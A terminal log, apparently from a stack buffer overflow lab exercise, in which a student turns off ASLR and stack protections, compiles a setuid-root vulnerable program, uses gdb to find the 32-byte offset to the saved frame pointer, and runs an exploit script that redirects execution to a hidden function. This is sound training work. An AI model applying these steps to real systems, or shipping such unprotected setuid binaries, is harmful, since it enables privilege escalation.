[06/16/22]seed@VM:~/.../leak_func$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
[06/16/22]seed@VM:~/.../leak_func$ ls
badfile  exploit.py  peda-session-stack_dbg.txt  stack  stack.c  stack_dbg
[06/16/22]seed@VM:~/.../leak_func$ ls
exploit.py  stack.c
[06/16/22]seed@VM:~/.../leak_func$ sudo ln -sf /bin/zsh /bin/sh
[06/16/22]seed@VM:~/.../leak_func$ su root
Password: 
root@VM:/home/seed/practice/leak_func# gcc  -m32 -o stack -z execstack -fno-stack-protector stack.c
root@VM:/home/seed/practice/leak_func# sudo chown root stack
root@VM:/home/seed/practice/leak_func# sudo chmod 4755 stack
root@VM:/home/seed/practice/leak_func# su seed
[06/16/22]seed@VM:~/.../leak_func$ touch badfile
[06/16/22]seed@VM:~/.../leak_func$ gcc -m32 -o stack_dbg -g -z execstack -fno-stack-protector stack.c
[06/16/22]seed@VM:~/.../leak_func$ gdb stack_dbg
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from stack_dbg...
gdb-peda$ b bof
Breakpoint 1 at 0x12ad: file stack.c, line 8.
gdb-peda$ run 
Starting program: /home/seed/practice/leak_func/stack_dbg 
Input size: 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffcffc --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557047 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffd138 --> 0x0 
ESP: 0xffffcfdc --> 0x565563b5 (<main+162>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x24
[------------------------------------stack-------------------------------------]
0000| 0xffffcfdc --> 0x565563b5 (<main+162>:	add    esp,0x10)
0004| 0xffffcfe0 --> 0xffffcffc --> 0x0 
0008| 0xffffcfe4 --> 0x0 
0012| 0xffffcfe8 --> 0x12c 
0016| 0xffffcfec --> 0x5655a1a0 --> 0xfbad2498 
0020| 0xffffcff0 --> 0x0 
0024| 0xffffcff4 --> 0x0 
0028| 0xffffcff8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffcffc "") at stack.c:8
8	{
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x0 
EDX: 0x56557047 --> 0x3d3d3d00 ('')
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0xffffcfd8 --> 0xffffd138 --> 0x0 
ESP: 0xffffcfb0 --> 0xf7fb4000 --> 0x1e6d6c 
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x24
   0x565562b8 <bof+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x20]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcfb0 --> 0xf7fb4000 --> 0x1e6d6c 
0004| 0xffffcfb4 --> 0xf7fb4000 --> 0x1e6d6c 
0008| 0xffffcfb8 --> 0xffffd138 --> 0x0 
0012| 0xffffcfbc --> 0xf7e20e09 (<printf+41>:	add    esp,0x1c)
0016| 0xffffcfc0 --> 0xf7fb4d20 --> 0xfbad2a84 
0020| 0xffffcfc4 ("8pUV\344\317\377\377")
0024| 0xffffcfc8 --> 0xffffcfe4 --> 0x0 
0028| 0xffffcfcc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
12	    strcpy(buffer, str);       
gdb-peda$ disas bof
Dump of assembler code for function bof:
   0x565562ad <+0>:	endbr32 
   0x565562b1 <+4>:	push   ebp
   0x565562b2 <+5>:	mov    ebp,esp
   0x565562b4 <+7>:	push   ebx
   0x565562b5 <+8>:	sub    esp,0x24
   0x565562b8 <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562bd <+16>:	add    eax,0x2cfb
=> 0x565562c2 <+21>:	sub    esp,0x8
   0x565562c5 <+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <+27>:	lea    edx,[ebp-0x20]
   0x565562cb <+30>:	push   edx
   0x565562cc <+31>:	mov    ebx,eax
   0x565562ce <+33>:	call   0x56556120 <strcpy@plt>
   0x565562d3 <+38>:	add    esp,0x10
   0x565562d6 <+41>:	mov    eax,0x1
   0x565562db <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x565562de <+49>:	leave  
   0x565562df <+50>:	ret    
End of assembler dump.
gdb-peda$ disas foo
Dump of assembler code for function foo:
   0x565562e0 <+0>:	endbr32 
   0x565562e4 <+4>:	push   ebp
   0x565562e5 <+5>:	mov    ebp,esp
   0x565562e7 <+7>:	push   ebx
   0x565562e8 <+8>:	sub    esp,0x4
   0x565562eb <+11>:	call   0x565563e3 <__x86.get_pc_thunk.ax>
   0x565562f0 <+16>:	add    eax,0x2cc8
   0x565562f5 <+21>:	sub    esp,0xc
   0x565562f8 <+24>:	lea    edx,[eax-0x1fb0]
   0x565562fe <+30>:	push   edx
   0x565562ff <+31>:	mov    ebx,eax
   0x56556301 <+33>:	call   0x56556130 <puts@plt>
   0x56556306 <+38>:	add    esp,0x10
   0x56556309 <+41>:	mov    eax,0x1
   0x5655630e <+46>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x56556311 <+49>:	leave  
   0x56556312 <+50>:	ret    
End of assembler dump.
gdb-peda$ p $ebp
$1 = (void *) 0xffffcfd8
gdb-peda$ p &buffer
$2 = (char (*)[24]) 0xffffcfb8
gdb-peda$ p/d 0xfd8 - 0xfb8
$3 = 32
gdb-peda$ q
[06/16/22]seed@VM:~/.../leak_func$ python3 exploit.py 
[06/16/22]seed@VM:~/.../leak_func$ ./stack
stack      stack.c    stack_dbg  
[06/16/22]seed@VM:~/.../leak_func$ ./stack
Input size: 300
Segmentation fault
[06/16/22]seed@VM:~/.../leak_func$ python3 exploit.py 
[06/16/22]seed@VM:~/.../leak_func$ ./stack
Input size: 300
Sensiive Info Leaked 
Segmentation fault
[06/16/22]seed@VM:~/.../leak_func$ 32 + 4 ADD KORTE HOITO EIJONNO AGER BAR HOINI
